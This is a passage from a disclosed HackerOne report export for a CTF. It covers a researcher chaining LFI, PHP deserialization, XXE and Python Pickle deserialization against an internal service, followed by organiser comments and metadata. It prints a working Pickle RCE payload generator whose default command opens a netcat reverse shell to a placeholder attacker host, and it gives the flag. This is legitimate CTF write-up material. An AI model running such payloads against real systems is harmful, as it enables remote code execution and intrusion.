src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/625/92ca2355abb91800d80f5578290bd154850f0cdc/7.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=57a54743a9f92a3e710e9c06281ef70007ff4e03790acfb96eeaedc4c8baf0ef\" class=\"markdown-inline-image\"></a></p>\n\n<p>The service contained two functionalities:</p>\n\n<ul>\n<li>\n<code>/status</code> which showed the current maintenance status.</li>\n<li>\n<code>/update-status</code> which could be used to update the maintenance status somehow.</li>\n</ul>\n\n<p>Both of the functionalities supported <code>debug</code> GET-parameter which results in seeing some additional debug messages on the HTTP-responses.<br>\nBy sending a request (again with the XXE) towards <code>http://127.0.0.1:1337/status?debug=true</code>, the server returned the following response:</p>\n<pre class=\"highlight plaintext\"><code>Maintenance mode: off | Debug: KGlhcHAKU3RhdHVzCnAxCihkcDIKUydtZXNzYWdlJwpwMwpTJ01haW50ZW5hbmNlIG1vZGU6IG9mZicKcDQKc1MnbWFpbnRlbmFuY2UnCnA1CkkwMApzYi4=\n</code></pre>\n<p>Base64-decoding revealed a Pickle-serialized Python object:</p>\n<pre class=\"highlight plaintext\"><code>(iapp\nStatus\np1\n(dp2\nS&#39;message&#39;\np3\nS&#39;Maintenance mode: off&#39;\np4\nsS&#39;maintenance&#39;\np5\nI00\nsb.\n</code></pre>\n<p>Now through some trial and error, I detected that the <code>/update-status</code>-page accepts GET-parameter <code>status</code> in which the base64-encoded serialized Python-object could be sent.<br>\nThis can be exploited in a similar way as the PHP serialization but will gain an actual OS-command execution possibility. It is also a bit simpler to exploit than the PHP-serialization, as we do not need to use any existing imported classes.</p>\n\n<p>The following RCE-payload generator was used (source: <a title=\"https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd\" href=\"/redirect?signature=1cc955d7b4057aed55a1eaf4ee3319495c19cf7e&amp;url=https%3A%2F%2Fgist.github.com%2Fmgeeky%2Fcbc7017986b2ec3e247aab0b01a9edcd\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd</span><i class=\"icon-external-link\"></i></a>) to generate the Pickle serialized payload:</p>\n<pre class=\"highlight plaintext\"><code>import cPickle\nimport sys\nimport base64\n\nDEFAULT_COMMAND = &quot;nc -e /bin/sh ATTACKER_SERVER_DOMAIN 8080&quot;\nCOMMAND = sys.argv[1] if len(sys.argv) &gt; 1 else DEFAULT_COMMAND\n\nclass PickleRce(object):\n    def __reduce__(self):\n        import os\n        return (os.system,(COMMAND,))\n\nprint base64.b64encode(cPickle.dumps(PickleRce()))\n</code></pre>\n<p>Now when the payload was sent to the <code>/update-status</code>-page in the <code>status</code>-parameter, the application deserialized it and executed the netcat which connected to my server with a reverse shell:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"8.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/626/347d5096268e757ed43a58ed19bc8710a92c9613/8.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=75a92f497f204a43fb6f6b6d592decb07c66fa69336d278343c1912ed8b958ea\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/626/347d5096268e757ed43a58ed19bc8710a92c9613/8.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=75a92f497f204a43fb6f6b6d592decb07c66fa69336d278343c1912ed8b958ea\" class=\"markdown-inline-image\"></a></p>\n\n<p>TL;DR: </p>\n\n<ol>\n<li>Gain information of target via LFI.</li>\n<li>Chain PHP Object deserialization + XXE + Python object deserialization to gain OS-command access to a internal host. </li>\n</ol>\n", 
            "type": "Activities::Comment", 
            "id": 3394827, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-09-26T22:28:23.841Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-26T22:40:48.506Z", 
            "actor": {
                "username": "putsi", 
                "url": "/putsi", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "`Hackers must be in Buenos Aires to attend. `\n\nI'm located in Finland and not Buenos Aires so I'm playing this CTF just for fun.", 
            "markdown_message": "<p><code>Hackers must be in Buenos Aires to attend.</code></p>\n\n<p>I&#39;m located in Finland and not Buenos Aires so I&#39;m playing this CTF just for fun.</p>\n", 
            "type": "Activities::Comment", 
            "id": 3394859, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/159/cc17916d728a3fc8204b600feabb621fe50c6b73/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e779cabb7352f84f5d088d99aef72a6da5dfd9f759564dd553f76f10cecd69f9", 
                    "type": "image/png", 
                    "id": 352159, 
                    "filename": "image.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2018-09-28T00:47:00.533Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-28T00:47:00.533Z", 
            "actor": {
                "username": "0xacb", 
                "url": "/0xacb", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "Hello @putsi! Thanks for participating. Congratulations! Amazing job on solving the CTF. You were the first! Since you're not in Buenos Aires we'll close it as resolved.\n\n{F352159}", 
            "markdown_message": "<p>Hello <a href=\"/putsi\">@putsi</a>! Thanks for participating. Congratulations! Amazing job on solving the CTF. You were the first! Since you&#39;re not in Buenos Aires we&#39;ll close it as resolved.</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"image.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/159/cc17916d728a3fc8204b600feabb621fe50c6b73/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=e779cabb7352f84f5d088d99aef72a6da5dfd9f759564dd553f76f10cecd69f9\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/159/cc17916d728a3fc8204b600feabb621fe50c6b73/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=e779cabb7352f84f5d088d99aef72a6da5dfd9f759564dd553f76f10cecd69f9\" class=\"markdown-inline-image\"></a></p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 3399690, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "putsi", 
                "url": "/putsi"
            }, 
            "created_at": "2018-09-28T00:47:26.078Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-28T00:47:26.078Z", 
            "actor": {
                "username": "0xacb", 
                "url": "/0xacb", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 3399691, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-09-28T06:45:03.372Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-28T06:45:03.372Z", 
            "actor": {
                "username": "putsi", 
                "url": "/putsi", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "Yay!\n\n@0xacb, since I'm still not in Buenos Aires, could it be possible to get an OATH bug bounty invite as a consolation prize?\n\nKind regards,\n@putsi", 
            "markdown_message": "<p>Yay!</p>\n\n<p><a href=\"/0xacb\">@0xacb</a>, since I&#39;m still not in Buenos Aires, could it be possible to get an OATH bug bounty invite as a consolation prize?</p>\n\n<p>Kind regards,<br>\n<a href=\"/putsi\">@putsi</a></p>\n", 
            "type": "Activities::Comment", 
            "id": 3400232, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-09-28T23:30:00.704Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-28T23:30:00.704Z", 
            "actor": {
                "username": "0xacb", 
                "url": "/0xacb", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "We are excited to inform you that we are opening participation in h1-5411 to entire teams and to virtual participants! Please keep an eye on your email for your invite to the program!\n\nBest of luck and happy hacking!", 
            "markdown_message": "<p>We are excited to inform you that we are opening participation in h1-5411 to entire teams and to virtual participants! Please keep an eye on your email for your invite to the program!</p>\n\n<p>Best of luck and happy hacking!</p>\n", 
            "type": "Activities::Comment", 
            "id": 3404623, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-09-29T10:02:25.072Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-29T10:02:25.072Z", 
            "actor": {
                "username": "putsi", 
                "url": "/putsi", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "Yay but why is the program disabled already @0xacb?", 
            "markdown_message": "<p>Yay but why is the program disabled already <a href=\"/0xacb\">@0xacb</a>?</p>\n", 
            "type": "Activities::Comment", 
            "id": 3405649, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-09-29T19:02:27.360Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-29T19:02:27.360Z", 
            "actor": {
                "username": "0xacb", 
                "url": "/0xacb", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "Hey @putsi everything good? Are you on slack and the program already?", 
            "markdown_message": "<p>Hey <a href=\"/putsi\">@putsi</a> everything good? Are you on slack and the program already?</p>\n", 
            "type": "Activities::Comment", 
            "id": 3407427, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-09-29T19:04:37.115Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-29T19:04:37.115Z", 
            "actor": {
                "username": "putsi", 
                "url": "/putsi", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "Hey @0xacb,\n\nI'm in the program but not in the slack.\nA bit of late start as the program invite came during the night.\n\nKind regards,\n@putsi", 
            "markdown_message": "<p>Hey <a href=\"/0xacb\">@0xacb</a>,</p>\n\n<p>I&#39;m in the program but not in the slack.<br>\nA bit of late start as the program invite came during the night.</p>\n\n<p>Kind regards,<br>\n<a href=\"/putsi\">@putsi</a></p>\n", 
            "type": "Activities::Comment", 
            "id": 3407436, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-10-08T15:31:51.156Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-10-08T15:31:51.156Z", 
            "actor": {
                "username": "putsi", 
                "url": "/putsi", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 3449093, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-10-22T16:01:59.659Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-10-22T16:01:59.659Z", 
            "actor": {
                "username": "nahamsec", 
                "url": "/nahamsec", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/413/d2674e2e9e932d4a399a03176edca6b400a0c0d3_medium.png?1516918330"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "We would like to publicly disclose your submission. Thanks again for participating in the MemeCTF Challenge. ", 
            "markdown_message": "<p>We would like to publicly disclose your submission. Thanks again for participating in the MemeCTF Challenge. </p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 3514754, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-10-22T16:01:59.712Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-10-22T16:01:59.712Z", 
            "actor": {
                "username": "nahamsec", 
                "url": "/nahamsec", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/413/d2674e2e9e932d4a399a03176edca6b400a0c0d3_medium.png?1516918330"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 3514755, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "putsi", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/putsi", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/044/111/233424ba88808cb50a8260226bf1af769be0f42d_small.png?1505158469"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -2529811.87205133, 
    "disclosed_at": "2018-10-22T16:01:59.699Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/415092", 
    "created_at": "2018-09-26T21:45:48.071Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Got the flag:</p>\n\n<p>flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}</p>\n\n<p>Will submit the writeup as soon as I finalize it.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>-</p>\n", 
    "vulnerability_information": "Got the flag:\n\nflag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}\n\nWill submit the writeup as soon as I finalize it.\n\n## Impact\n\n-", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://tbd.com", 
            "about": null, 
            "twitter_handle": null, 
            "name": "h1-5411-CTF"
        }, 
        "handle": "h1-5411-ctf", 
        "url": "https://hackerone.com/h1-5411-ctf", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/033/314/1a0c110b0060c574d84b531160a0d2c58141ce6e_small.?1537539140", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/033/314/78d6c799326d92d4cad56dc8c1899a7ea55bc7f2_medium.?1537539140"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 33314, 
        "default_currency": "usd"
    }, 
    "is_published": false
}